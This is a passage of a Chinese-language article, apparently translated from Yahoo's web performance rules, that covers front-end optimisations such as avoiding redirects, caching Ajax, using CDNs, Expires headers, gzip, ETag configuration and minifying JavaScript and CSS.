<p>减少主机名的数量还可以减少页面中并行下载的数量。减少 DNS 查找次数可以节省响应时间，但是减少并行下载却会增加响应时间。我的指导原则是把这些页面中 的内容分割成至少两部分但不超过四部分。这种结果就是在减少 DNS 查找次数和保持较高程度并行下载两者之间的权衡了。 </p>
<h2 id="3、避免跳转"><a href="#3、避免跳转" class="headerlink" title="3、避免跳转"></a>3、避免跳转</h2><p>跳转是使用 301 和 302 代码实现的。下面是一个响应代码为 301 的 HTTP 头：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently </span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://example.com/newuri </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html </span><br></pre></td></tr></table></figure>

<p>浏览器会把用户指向到 Location 中指定的 URL。头文件中的所有信息在一次跳转中都是必需的，内容部分可以为空。不管他们的名称，301 和 302 响应都不会被缓存除非增加一个额外的头选项，如 Expires 或者 Cache-Control 来指定它缓存。<code>&lt;meat /&gt;</code> 元素的刷新标签和 JavaScript 也可以实现 URL 的跳转，但是如果你必须要跳转的时候，最好的方法就是使用标准的 3XXHTTP 状态代 码，这主要是为了确保 “后退” 按钮可以正确地使用。 </p>
<p>但是要记住跳转会降低用户体验。在用户和 HTML 文档中间增加一个跳转，会拖延页面中所有元素的显示，因为在 HTML 文件被加载前任何文件（图像、 Flash 等）都不会被下载。 </p>
<p>有一种经常被网页开发者忽略却往往十分浪费响应时间的跳转现象。这种现象发生在当 URL 本该有斜杠（&#x2F;）却被忽略掉时。例如，当我们要访问 http: &#x2F;&#x2F;astrology.yahoo.com&#x2F;astrology 时，实际上返回的是一个包含 301 代码的跳转，它指向的是 <span class="exturl" data-url="aHR0cDovL2FzdHJvbG9neS55YWhvby5jb20vYXN0cm9sb2d5Lw==">http://astrology.yahoo.com/astrology/<i class="fa fa-external-link-alt"></i></span> （注意末尾的斜杠）。在 Apache 服务器中可以使用 Alias 或者 mod_rewrite 或者 the DirectorySlash 来避免。 </p>
<p>连接新网站和旧网站是跳转功能经常被用到的另一种情况。这种情况下往往要连接网站的不同内容然后根据用户的不同类型（如浏览器类型、用户账号所属类型）来 进行跳转。使用跳转来实现两个网站的切换十分简单，需要的代码量也不多。尽管使用这种方法对于开发者来说可以降低复杂程度，但是它同样降低用户体验。一个 可替代方法就是如果两者在同一台服务器上时使用 Alias 和 mod_rewrite 和实现。如果是因为域名的不同而采用跳转，那么可以通过使用 Alias 或者 mod_rewirte 建立 CNAME（保存一个域名和另外一个域名之间关系的 DNS 记录）来替代。 </p>
<h2 id="4、可缓存的-AJAX"><a href="#4、可缓存的-AJAX" class="headerlink" title="4、可缓存的 AJAX"></a>4、可缓存的 AJAX</h2><p>Ajax 经常被提及的一个好处就是由于其从后台服务器传输信息的异步性而为用户带来的反馈的即时性。但是，使用 Ajax 并不能保证用户不会在等待异 步的 JavaScript 和 XML 响应上花费时间。在很多应用中，用户是否需要等待响应取决于 Ajax 如何来使用。例如，在一个基于 Web 的 Email 客户端 中，用户必须等待 Ajax 返回符合他们条件的邮件查询结果。记住一点，“异步” 并不异味着 “即时”，这很重要。 </p>
<p>为了提高性能，优化 Ajax 响应是很重要的。提高 Ajxa 性能的措施中最重要的方法就是使响应具有可缓存性，具体的讨论可以查看 Add an Expires or a Cache-Control Header。其它的几条规则也同样适用于 Ajax： </p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">Gizp 压缩文件 </span><br><span class="line">减少 DNS 查找次数 </span><br><span class="line">精简 <span class="keyword">JavaScript </span></span><br><span class="line">避免跳转 </span><br><span class="line">配置 ETags</span><br></pre></td></tr></table></figure>

<p>让我们来看一个例子：一个 Web2.0 的 Email 客户端会使用 Ajax 来自动完成对用户地址薄的下载。如果用户在上次使用过 Email web 应用程序后没有对地址薄作任何的修改，而且 Ajax 响应通过 Expire 或者 Cacke-Control 头来实现缓存，那么就可以直接从上一次的缓 存中读取地址薄了。必须告知浏览器是使用缓存中的地址薄还是发送一个新的请求。这可以通过为读取地址薄的 Ajax URL 增加一个含有上次编辑时间的时间戳来实现，例如，&amp;t&#x3D;11900241612 等。如果地址薄在上次下载后没有被编辑过，时间戳就不变，则 从浏览器的缓存中加载从而减少了一次 HTTP 请求过程。如果用户修改过地址薄，时间戳就会用来确定新的 URL 和缓存响应并不匹配，浏览器就会重要请求更新 地址薄。 </p>
<p>即使你的 Ajxa 响应是动态生成的，哪怕它只适用于一个用户，那么它也应该被缓存起来。这样做可以使你的 Web2.0 应用程序更加快捷。 </p>
<h2 id="5、推迟加载内容"><a href="#5、推迟加载内容" class="headerlink" title="5、推迟加载内容"></a>5、推迟加载内容</h2><p>你可以仔细看一下你的网页，问问自己 “哪些内容是页面呈现时所必需首先加载的？哪些内容和结构可以稍后再加载？ </p>
<p>把整个过程按照 onload 事件分隔成两部分，JavaScript 是一个理想的选择。例如，如果你有用于实现拖放和动画的 JavaScript，那么它 就以等待稍后加载，因为页面上的拖放元素是在初始化呈现之后才发生的。其它的例如隐藏部分的内容（用户操作之后才显现的内容）和处于折叠部分的图像也可以 推迟加载 </p>
<p>工具可以节省你的工作量：YUI Image Loader 可以帮你推迟加载折叠部分的图片，YUI Get utility 是包含 JS 和 CSS 的便捷方法。比如你可以打开 Firebug 的 Net 选项卡看一下 Yahoo 的首页。 </p>
<p>当性能目标和其它网站开发实践一致时就会相得益彰。这种情况下，通过程序提高网站性能的方法告诉我们，在支持 JavaScript 的情况下，可以先去除用 户体验，不过这要保证你的网站在没有 JavaScript 也可以正常运行。在确定页面运行正常后，再加载脚本来实现如拖放和动画等更加花哨的效果。 </p>
<h2 id="6、预加载"><a href="#6、预加载" class="headerlink" title="6、预加载"></a>6、预加载</h2><p>预加载和后加载看起来似乎恰恰相反，但实际上预加载是为了实现另外一种目标。预加载是在浏览器空闲时请求将来可能会用到的页面内容（如图像、样式表和脚 本）。使用这种方法，当用户要访问下一个页面时，页面中的内容大部分已经加载到缓存中了，因此可以大大改善访问速度。 </p>
<p>下面提供了几种预加载方法：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">无条件加载：触发 onload 事件时，直接加载额外的页面内容。以 Google<span class="selector-class">.com</span> 为例，你可以看一下它的 spirit image 图像是怎样在 onload 中加载的。这个 spirit image 图像在 google<span class="selector-class">.com</span> 主页中是不需要的，但是却可以在搜索结果页面中用到它。 </span><br><span class="line">有条件加载：根据用户的操作来有根据地判断用户下面可能去往的页面并相应的预加载页面内容。在 search<span class="selector-class">.yahoo</span><span class="selector-class">.com</span> 中你可以看到如何在你输入内容时加载额外的页面内容。 </span><br><span class="line">有预期的加载：载入重新设计过的页面时使用预加载。这种情况经常出现在页面经过重新设计后用户抱怨 “新的页面看起来很酷，但是却比以前慢”。问题可能出在 用户对于你的旧站点建立了完整的缓存，而对于新站点却没有任何缓存内容。因此你可以在访问新站之前就加载一部内容来避免这种结果的出现。在你的旧站中利用 浏览器的空余时间加载新站中用到的图像的和脚本来提高访问速度。 </span><br></pre></td></tr></table></figure>


<h2 id="7、减少-DOM-元素数量"><a href="#7、减少-DOM-元素数量" class="headerlink" title="7、减少 DOM 元素数量"></a>7、减少 DOM 元素数量</h2><p>一个复杂的页面意味着需要下载更多数据，同时也意味着 JavaScript 遍历 DOM 的效率越慢。比如当你增加一个事件句柄时在 500 和 5000 个 DOM 元素中循环效果肯定是不一样的。 </p>
<p>大量的 DOM 元素的存在意味着页面中有可以不用移除内容只需要替换元素标签就可以精简的部分。你在页面布局中使用表格了吗？你有没有仅仅为了布局而引入更多的 <code>&lt;div&gt;</code> 元素呢？也许会存在一个适合或者在语意是更贴切的标签可以供你使用。 </p>
<p>YUI CSS utilities 可以给你的布局带来巨大帮助：grids.css 可以帮你实现整体布局，font.css 和 reset.css 可以帮助你移除浏览器默 认格式。它提供了一个重新审视你页面中标签的机会，比如只有在语意上有意义时才使用 <code>&lt;div&gt;</code>，而不是因为它具有换行效果才使用它。 </p>
<p>DOM 元素数量很容易计算出来，只需要在 Firebug 的控制台内输入： </p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">document.getElementsByTagName(‘*’).<span class="built_in">length</span></span><br></pre></td></tr></table></figure>

<p>那么多少个 DOM 元素算是多呢？这可以对照有很好标记使用的类似页面。比如 Yahoo! 主页是一个内容非常多的页面，但是它只使用了 700 个元素（HTML 标签）。 </p>
<h2 id="8、根据域名划分页面内容"><a href="#8、根据域名划分页面内容" class="headerlink" title="8、根据域名划分页面内容"></a>8、根据域名划分页面内容</h2><p>把页面内容划分成若干部分可以使你最大限度地实现平行下载。由于 DNS 查找带来的影响你首先要确保你使用的域名数量在 2 个到 4 个之间。例如，你可以 把用到的 HTML 内容和动态内容放在 <span class="exturl" data-url="aHR0cDovL3d3dy5leGFtcGxlLm9yZy8=">www.example.org<i class="fa fa-external-link-alt"></i></span> 上，而把页面各种组件（图片、脚本、CSS) 分别存放在 statics1.example.org 和 statics.example.org 上。 </p>
<p>你可在 Tenni Theurer 和 Patty Chi 合写的文章 Maximizing Parallel Downloads in the Carpool Lane 找到更多相关信息。 </p>
<h2 id="9、使-iframe-的数量最小"><a href="#9、使-iframe-的数量最小" class="headerlink" title="9、使 iframe 的数量最小"></a>9、使 iframe 的数量最小</h2><p>ifrmae 元素可以在父文档中插入一个新的 HTML 文档。了解 iframe 的工作理然后才能更加有效地使用它，这一点很重要。 </p>
<p><code>&lt;iframe&gt;</code> 优点： </p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">解决加载缓慢的第三方内容如图标和广告等的加载问题 </span><br><span class="line">Security <span class="keyword">sandbox</span> </span><br><span class="line">并行加载脚本</span><br></pre></td></tr></table></figure>

<p><code>&lt;iframe&gt;</code> 的缺点：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">即时内容为空，加载也需要时间 </span><br><span class="line">会阻止页面加载 </span><br><span class="line">没有语意 </span><br></pre></td></tr></table></figure>


<h2 id="10、不要出现-404-错误"><a href="#10、不要出现-404-错误" class="headerlink" title="10、不要出现 404 错误"></a>10、不要出现 404 错误</h2><p>HTTP 请求时间消耗是很大的，因此使用 HTTP 请求来获得一个没有用处的响应（例如 404 没有找到页面）是完全没有必要的，它只会降低用户体验而不会有一点好处。 </p>
<p>有些站点把 404 错误响应页面改为 “你是不是要找 ***”，这虽然改进了用户体验但是同样也会浪费服务器资源（如数据库等）。最糟糕的情况是指向外部 JavaScript 的链接出现问题并返回 404 代码。首先，这种加载会破坏并行加载；其次浏览器会把试图在返回的 404 响应内容中找到可能有用的部分当 作 JavaScript 代码来执行。 </p>
<h2 id="11、使用内容分发网络"><a href="#11、使用内容分发网络" class="headerlink" title="11、使用内容分发网络"></a>11、使用内容分发网络</h2><p>用户与你网站服务器的接近程度会影响响应时间的长短。把你的网站内容分散到多个、处于不同地域位置的服务器上可以加快下载速度。但是首先我们应该做些什么呢？ </p>
<p>按地域布置网站内容的第一步并不是要尝试重新架构你的网站让他们在分发服务器上正常运行。根据应用的需求来改变网站结构，这可能会包括一些比较复杂的任 务，如在服务器间同步 Session 状态和合并数据库更新等。要想缩短用户和内容服务器的距离，这些架构步骤可能是不可避免的。 </p>
<p>要记住，在终端用户的响应时间中有 80% 到 90% 的响应时间用于下载图像、样式表、脚本、Flash 等页面内容。这就是网站性能黄金守则。和重新设计你的 应用程序架构这样比较困难的任务相比，首先来分布静态内容会更好一点。这不仅会缩短响应时间，而且对于内容分发网络来说它更容易实现。 </p>
<p>内容分发网络（Content Delivery Network，CDN）是由一系列分散到各个不同地理位置上的 Web 服务器组成的，它提高了网站内容的传输速度。用于向用户传输内容的服务器主要是根据 和用户在网络上的靠近程度来指定的。例如，拥有最少网络跳数（network hops）和响应速度最快的服务器会被选定。 </p>
<p>一些大型的网络公司拥有自己的 CDN，但是使用像 Akamai Technologies，Mirror Image Internet， 或者 Limelight Networks 这样的 CDN 服务成本却非常高。对于刚刚起步的企业和个人网站来说，可能没有使用 CDN 的成本预算，但是随着目标用户群的不断扩大和更加 全球化，CDN 就是实现快速响应所必需的了。以 Yahoo 来说，他们转移到 CDN 上的网站程序静态内容节省了终端用户 20% 以上的响应时间。使用 CDN 是 一个只需要相对简单地修改代码实现显著改善网站访问速度的方法。 </p>
<h2 id="12、为文件头指定-Expires-或-Cache-Control"><a href="#12、为文件头指定-Expires-或-Cache-Control" class="headerlink" title="12、为文件头指定 Expires 或 Cache-Control"></a>12、为文件头指定 Expires 或 Cache-Control</h2><p>这条守则包括两方面的内容： </p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">对于静态内容：设置文件头过期时间 Expires 的值为 “<span class="built_in">Never</span> expire”（永不过期） </span><br><span class="line">对于动态内容：使用恰当的 Cache-Control 文件头来帮助浏览器进行有条件的请求 </span><br></pre></td></tr></table></figure>

<p>网页内容设计现在越来越丰富，这就意味着页面中要包含更多的脚本、样式表、图片和 Flash。第一次访问你页面的用户就意味着进行多次的 HTTP 请求，但 是通过使用 Expires 文件头就可以使这样内容具有缓存性。它避免了接下来的页面访问中不必要的 HTTP 请求。Expires 文件头经常用于图像文件， 但是应该在所有的内容都使用他，包括脚本、样式表和 Flash 等。 </p>
<p>浏览器（和代理）使用缓存来减少 HTTP 请求的大小和次数以加快页面访问速度。Web 服务器在 HTTP 响应中使用 Expires 文件头来告诉客户端内容需 要缓存多长时间。下面这个例子是一个较长时间的 Expires 文件头，它告诉浏览器这个响应直到 2010 年 4 月 15 日才过期。 </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Expires</span>: Thu, <span class="number">15</span> Apr <span class="number">2010</span> <span class="number">20</span>:<span class="number">00</span>:<span class="number">00</span> GMT </span><br></pre></td></tr></table></figure>

<p>如果你使用的是 Apache 服务器，可以使用 ExpiresDefault 来设定相对当前日期的过期时间。下面这个例子是使用 ExpiresDefault 来设定请求时间后 10 年过期的文件头： </p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">ExpiresDefault “<span class="keyword">access</span> plus <span class="number">10</span> years” </span><br></pre></td></tr></table></figure>

<p>要切记，如果使用了 Expires 文件头，当页面内容改变时就必须改变内容的文件名。依 Yahoo! 来说我们经常使用这样的步骤：在内容的文件名中加上版本号，如 yahoo_2.0.6.js。 </p>
<p>使用 Expires 文件头只有会在用户已经访问过你的网站后才会起作用。当用户首次访问你的网站时这对减少 HTTP 请求次数来说是无效的，因为浏览器的缓 存是空的。因此这种方法对于你网站性能的改进情况要依据他们 “预缓存” 存在时对你页面的点击频率（“预缓存” 中已经包含了页面中的所有内容）。 Yahoo! 建立了一套测量方法，我们发现所有的页面浏览量中有 75~85% 都有 “预缓存”。通过使用 Expires 文件头，增加了缓存在浏览器中内容的 数量，并且可以在用户接下来的请求中再次使用这些内容，这甚至都不需要通过用户发送一个字节的请求。 </p>
<h2 id="13、Gzip-压缩文件内容"><a href="#13、Gzip-压缩文件内容" class="headerlink" title="13、Gzip 压缩文件内容"></a>13、Gzip 压缩文件内容</h2><p>网络传输中的 HTTP 请求和应答时间可以通过前端机制得到显著改善。的确，终端用户的带宽、互联网提供者、与对等交换点的靠近程度等都不是网站开发者所能决定的。但是还有其他因素影响着响应时间。通过减小 HTTP 响应的大小可以节省 HTTP 响应时间。 </p>
<p>从 HTTP&#x2F;1.1 开始，web 客户端都默认支持 HTTP 请求中有 Accept-Encoding 文件头的压缩格式： </p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Accept</span>-Encoding: gzip, deflate </span><br></pre></td></tr></table></figure>

<p>如果 web 服务器在请求的文件头中检测到上面的代码，就会以客户端列出的方式压缩响应内容。Web 服务器把压缩方式通过响应文件头中的 Content- Encoding 来返回给浏览器。 </p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Encoding</span>: gzip</span><br></pre></td></tr></table></figure>

<p>Gzip 是目前最流行也是最有效的压缩方式。这是由 GNU 项目开发并通过 RFC 1952 来标准化的。另外仅有的一个压缩格式是 deflate，但是它的使用范围有限效果也稍稍逊色。 </p>
<p>Gzip 大概可以减少 70% 的响应规模。目前大约有 90% 通过浏览器传输的互联网交换支持 gzip 格式。如果你使用的是 Apache，gzip 模块配置和你的版本有关：Apache 1.3 使用 mod_zip，而 Apache 2.x 使用 moflate。 </p>
<p>浏览器和代理都会存在这样的问题：浏览器期望收到的和实际接收到的内容会存在不匹配的现象。幸好，这种特殊情况随着旧式浏览器使用量的减少在减少。 Apache 模块会通过自动添加适当的 Vary 响应文件头来避免这种状况的出现。 </p>
<p>服务器根据文件类型来选择需要进行 gzip 压缩的文件，但是这过于限制了可压缩的文件。大多数 web 服务器会压缩 HTML 文档。对脚本和样式表进行压缩同 样也是值得做的事情，但是很多 web 服务器都没有这个功能。实际上，压缩任何一个文本类型的响应，包括 XML 和 JSON，都值得的。图像和 PDF 文件由于 已经压缩过了所以不能再进行 gzip 压缩。如果试图 gizp 压缩这些文件的话不但会浪费 CPU 资源还会增加文件的大小。 </p>
<p>Gzip 压缩所有可能的文件类型是减少文件体积增加用户体验的简单方法。 </p>
<h2 id="14、配置-ETag"><a href="#14、配置-ETag" class="headerlink" title="14、配置 ETag"></a>14、配置 ETag</h2><p>Entity tags（ETags）（实体标签）是 web 服务器和浏览器用于判断浏览器缓存中的内容和服务器中的原始内容是否匹配的一种机制（“实体” 就是所说的 “内 容”，包括图片、脚本、样式表等）。增加 ETag 为实体的验证提供了一个比使用 “last-modified date（上次编辑时间）” 更加灵活的机制。Etag 是一个识别内容版本号的唯一字符串。唯一的格式限制就是它必须包含在双引号内。原始服务器通过含有 ETag 文件头的响应指定页面内容的 ETag。 </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">200</span> OK </span><br><span class="line"><span class="attribute">Last</span>-Modified: Tue, <span class="number">12</span> Dec <span class="number">2006</span> <span class="number">03</span>:<span class="number">03</span>:<span class="number">59</span> GMT </span><br><span class="line"><span class="attribute">ETag</span>: “<span class="number">10</span>c24bc-<span class="number">4</span>ab-<span class="number">457</span>e1c1f” </span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">12195</span> </span><br></pre></td></tr></table></figure>

<p>稍后，如果浏览器要验证一个文件，它会使用 If-None-Match 文件头来把 ETag 传回给原始服务器。在这个例子中，如果 ETag 匹配，就会返回一 个 304 状态码，这就节省了 12195 字节的响应。 GET &#x2F;i&#x2F;yahoo.gif HTTP&#x2F;1.1 </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Host</span>: us.yimg.com </span><br><span class="line"><span class="attribute">If</span>-Modified-Since: Tue, <span class="number">12</span> Dec <span class="number">2006</span> <span class="number">03</span>:<span class="number">03</span>:<span class="number">59</span> GMT </span><br><span class="line"><span class="attribute">If</span>-None-Match: “<span class="number">10</span>c24bc-<span class="number">4</span>ab-<span class="number">457</span>e1c1f” </span><br><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">304</span> Not Modified </span><br></pre></td></tr></table></figure>

<p>ETag 的问题在于，它是根据可以辨别网站所在的服务器的具有唯一性的属性来生成的。当浏览器从一台服务器上获得页面内容后到另外一台服务器上进行验证时 ETag 就会不匹配，这种情况对于使用服务器组和处理请求的网站来说是非常常见的。默认情况下，Apache 和 IIS 都会把数据嵌入 ETag 中，这会显著 减少多服务器间的文件验证冲突。 </p>
<p>Apache 1.3 和 2.x 中的 ETag 格式为 inode-size-timestamp。即使某个文件在不同的服务器上会处于相同的目录下，文件大小、权限、时间戳等都完全相同，但是在不同服务器上他们的内码也是不同的。 </p>
<p>IIS 5.0 和 IIS 6.0 处理 ETag 的机制相似。IIS 中的 ETag 格式为 Filetimestamp:ChangeNumber。用 ChangeNumber 来跟踪 IIS 配置的改变。网站所用的不同 IIS 服务器间 ChangeNumber 也不相同。 不同的服务器上的 Apache 和 IIS 即使对于完全相同的内容产生的 ETag 在也不相同，用户并不会接收到一个小而快的 304 响应；相反他们会接收一个正 常的 200 响应并下载全部内容。如果你的网站只放在一台服务器上，就不会存在这个问题。但是如果你的网站是架设在多个服务器上，并且使用 Apache 和 IIS 产生默认的 ETag 配置，你的用户获得页面就会相对慢一点，服务器会传输更多的内容，占用更多的带宽，代理也不会有效地缓存你的网站内容。即使你的 内容拥有 Expires 文件头，无论用户什么时候点击 “刷新” 或者 “重载” 按钮都会发送相应的 GET 请求。 </p>
<p>如果你没有使用 ETag 提供的灵活的验证模式，那么干脆把所有的 ETag 都去掉会更好。Last-Modified 文件头验证是基于内容的时间戳的。去掉 ETag 文件头会减少响应和下次请求中文件的大小。微软的这篇支持文稿讲述了如何去掉 ETag。在 Apache 中，只需要在配置文件中简单添加下面一行代 码就可以了： </p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">FileETag</span> <span class="literal">none</span> </span><br></pre></td></tr></table></figure>


<h2 id="15、尽早刷新输出缓冲"><a href="#15、尽早刷新输出缓冲" class="headerlink" title="15、尽早刷新输出缓冲"></a>15、尽早刷新输出缓冲</h2><p>当用户请求一个页面时，无论如何都会花费 200 到 500 毫秒用于后台组织 HTML 文件。在这期间，浏览器会一直空闲等待数据返回。在 PHP 中，你可 以使用 flush () 方法，它允许你把已经编译的好的部分 HTML 响应文件先发送给浏览器，这时浏览器就会可以下载文件中的内容（脚本等）而后台同时处理剩余的 HTML 页面。这样做的效果会在后台烦恼或者前台较空闲时更加明显。 </p>
<p>输出缓冲应用最好的一个地方就是紧跟在 <code>&lt;head /&gt;</code> 之后，因为 HTML 的头部分容易生成而且头部往往包含 CSS 和 JavaScript 文件，这样浏览器就可以在后台编译剩余 HTML 的同时并行下载它们。 例子： </p>
<figure class="highlight bnf"><table><tr><td class="code"><pre><span class="line">… <span class="attribute">&lt;!– css, js –&gt;</span> </span><br><span class="line"><span class="attribute">&lt;/head&gt;</span> </span><br><span class="line"><span class="attribute">&lt;body&gt;</span> </span><br><span class="line">… <span class="attribute">&lt;!– content –&gt;</span> </span><br></pre></td></tr></table></figure>

<p>为了证明使用这项技术的好处，Yahoo! 搜索率先研究并完成了用户测试。 </p>
<h2 id="16、使用-GET-来完成-AJAX-请求"><a href="#16、使用-GET-来完成-AJAX-请求" class="headerlink" title="16、使用 GET 来完成 AJAX 请求"></a>16、使用 GET 来完成 AJAX 请求</h2><p>Yahoo!Mail 团队发现，当使用 XMLHttpRequest 时，浏览器中的 POST 方法是一个 “两步走” 的过程：首先发送文件头，然后才发 送数 据。因此使用 GET 最为恰当，因为它只需发送一个 TCP 包（除非你有很多 cookie）。IE 中 URL 的最大长度为 2K，因此如果你要发送一个超过 2K 的 数据时就不能使用 GET 了。 </p>
<p>一个有趣的不同就是 POST 并不像 GET 那样实际发送数据。根据 HTTP 规范，GET 意味着 “获取” 数据，因此当你仅仅获取数据时使用 GET 更加有意义（从语意上讲也是如此），相反，发送并在服务端保存数据时使用 POST。 </p>
<h2 id="17、把样式表置于顶部"><a href="#17、把样式表置于顶部" class="headerlink" title="17、把样式表置于顶部"></a>17、把样式表置于顶部</h2><p>在研究 Yahoo! 的性能表现时，我们发现把样式表放到文档的 <code>&lt;head /&gt;</code> 内部似乎会加快页面的下载速度。这是因为把样式表放到 &lt; head &#x2F;&gt; 内会使页面有步骤的加载显示。 </p>
<p>注重性能的前端服务器往往希望页面有秩序地加载。同时，我们也希望浏览器把已经接收到内容尽可能显示出来。这对于拥有较多内容的页面和网速较慢的用户来说 特别重要。向用户返回可视化的反馈，比如进程指针，已经有了较好的研究并形成了正式文档。在我们的研究中 HTML 页面就是进程指针。当浏览器有序地加载文 件头、导航栏、顶部的 logo 等对于等待页面加载的用户来说都可以作为可视化的反馈。这从整体上改善了用户体验。 </p>
<p>把样式表放在文档底部的问题是在包括 Internet Explorer 在内的很多浏览器中这会中止内容的有序呈现。浏览器中止呈现是为了避免样式改变引起的页面元素重绘。用户不得不面对一个空白页面。 </p>
<p>HTML 规范清楚指出样式表要放包含在页面的 <code>&lt;head /&gt;</code> 区域内：“和 &lt; a &#x2F;&gt; 不同，<code>&lt;link /&gt;</code> 只能出现在文档的 <code>&lt;head /&gt;</code> 区域内，尽管它可以多次使用它”。无论是引起白屏还是出现没有样式化的内容都不值得去尝试。最好的方案就是按照 HTML 规范在文 档 <code>&lt;head /&gt;</code> 内加载你的样式表。 </p>
<h2 id="18、避免使用-CSS-表达式（Expression）"><a href="#18、避免使用-CSS-表达式（Expression）" class="headerlink" title="18、避免使用 CSS 表达式（Expression）"></a>18、避免使用 CSS 表达式（Expression）</h2><p>CSS 表达式是动态设置 CSS 属性的强大（但危险）方法。Internet Explorer 从第 5 个版本开始支持 CSS 表达式。下面的例子中，使用 CSS 表达式可以实现隔一个小时切换一次背景颜色： </p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background-color</span>: <span class="built_in">expression</span>( (new <span class="built_in">Date</span>()).<span class="built_in">getHours</span>()%<span class="number">2</span> ? “<span class="number">#B8D4FF</span>” : “<span class="number">#F08A00</span>″ ); </span><br></pre></td></tr></table></figure>

<p>如上所示，expression 中使用了 JavaScript 表达式。CSS 属性根据 JavaScript 表达式的计算结果来设置。 expression 方法在其它浏览器中不起作用，因此在跨浏览器的设计中单独针对 Internet Explorer 设置时会比较有用。 </p>
<p>表达式的问题就在于它的计算频率要比我们想象的多。不仅仅是在页面显示和缩放时，就是在页面滚动、乃至移动鼠标时都会要重新计算一次。给 CSS 表达式增加一个计数器可以跟踪表达式的计算频率。在页面中随便移动鼠标都可以轻松达到 10000 次以上的计算量。 </p>
<p>一个减少 CSS 表达式计算次数的方法就是使用一次性的表达式，它在第一次运行时将结果赋给指定的样式属性，并用这个属性来代替 CSS 表达式。如果样式属性 必须在页面周期内动态地改变，使用事件句柄来代替 CSS 表达式是一个可行办法。如果必须使用 CSS 表达式，一定要记住它们要计算成千上万次并且可能会对你 页面的性能产生影响。 </p>
<h2 id="19、使用外部-JavaScript-和-CSS"><a href="#19、使用外部-JavaScript-和-CSS" class="headerlink" title="19、使用外部 JavaScript 和 CSS"></a>19、使用外部 JavaScript 和 CSS</h2><p>很多性能规则都是关于如何处理外部文件的。但是，在你采取这些措施前你可能会问到一个更基本的问题：JavaScript 和 CSS 是应该放在外部文件中呢还是把它们放在页面本身之内呢？ </p>
<p>在实际应用中使用外部文件可以提高页面速度，因为 JavaScript 和 CSS 文件都能在浏览器中产生缓存。内置在 HTML 文档中的 JavaScript 和 CSS 则会在每次请求中随 HTML 文档重新下载。这虽然减少了 HTTP 请求的次数，却增加了 HTML 文档的大小。从另一方面来说， 如果外部文件中的 JavaScript 和 CSS 被浏览器缓存，在没有增加 HTTP 请求次数的同时可以减少 HTML 文档的大小。 </p>
<p>关键问题是，外部 JavaScript 和 CSS 文件缓存的频率和请求 HTML 文档的次数有关。虽然有一定的难度，但是仍然有一些指标可以一测量它。如果一 个会话中用户会浏览你网站中的多个页面，并且这些页面中会重复使用相同的脚本和样式表，缓存外部文件就会带来更大的益处。 </p>
<p>许多网站没有功能建立这些指标。对于这些网站来说，最好的坚决方法就是把 JavaScript 和 CSS 作为外部文件引用。比较适合使用内置代码的例外就是 网站的主页，如 Yahoo! 主页和 My Yahoo!。主页在一次会话中拥有较少（可能只有一次）的浏览量，你可以发现内置 JavaScript 和 CSS 对于终端用户来说会加快响应时 间。 </p>
<p>对于拥有较大浏览量的首页来说，有一种技术可以平衡内置代码带来的 HTTP 请求减少与通过使用外部文件进行缓存带来的好处。其中一个就是在首页中内置 JavaScript 和 CSS，但是在页面下载完成后动态下载外部文件，在子页面中使用到这些文件时，它们已经缓存到浏览器了。 </p>
<h2 id="20、削减-JavaScript-和-CSS"><a href="#20、削减-JavaScript-和-CSS" class="headerlink" title="20、削减 JavaScript 和 CSS"></a>20、削减 JavaScript 和 CSS</h2><p>精简是指从去除代码不必要的字符减少文件大小从而节省下载时间。消减代码时，所有的注释、不需要的空白字符（空格、换行、tab 缩进）等都要去掉。 在 JavaScript 中，由于需要下载的文件体积变小了从而节省了响应时间。精简 JavaScript 中目前用到的最广泛的两个工具是 JSMin 和 YUI Compressor。YUI Compressor 还可用于精简 CSS。 </p>
<p>混淆是另外一种可用于源代码优化的方法。这种方法要比精简复杂一些并且在混淆的过程更易产生问题。在对美国前 10 大网站的调查中发现，精简也可以缩小原来 代码体积的 21%，而混淆可以达到 25%。尽管混淆法可以更好地缩减代码，但是对于 JavaScript 来说精简的风险更小。 </p>
<p>除消减外部的脚本和样式表文件外，<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code> 代码块也可以并且应该进行消减。即使你用 Gzip 压缩过脚本 和样式表，精简这些文件仍然可以节省 5% 以上的空间。由于 JavaScript 和 CSS 的功能和体积的增加，消减代码将会获得益处。 </p>
<h2 id="21、用-代替-import"><a href="#21、用-代替-import" class="headerlink" title="21、用  代替 @import"></a>21、用 <link> 代替 @import</h2><p>前面的最佳实现中提到 CSS 应该放置在顶端以利于有序加载呈现。 </p>
<p>在 IE 中，页面底部 @import 和使用 <code>&lt;link&gt;</code> 作用是一样的，因此最好不要使用它。 </p>
<h2 id="22、避免使用滤镜"><a href="#22、避免使用滤镜" class="headerlink" title="22、避免使用滤镜"></a>22、避免使用滤镜</h2><p>IE 独有属性 AlphaImageLoader 用于修正 7.0 以下版本中显示 PNG 图片的半透明效果。这个滤镜的问题在于浏览器加载图片时它会终止内容的 呈现并且冻结浏览器。在每一个元素（不仅仅是图片）它都会运算一次，增加了内存开支，因此它的问题是多方面的。 </p>
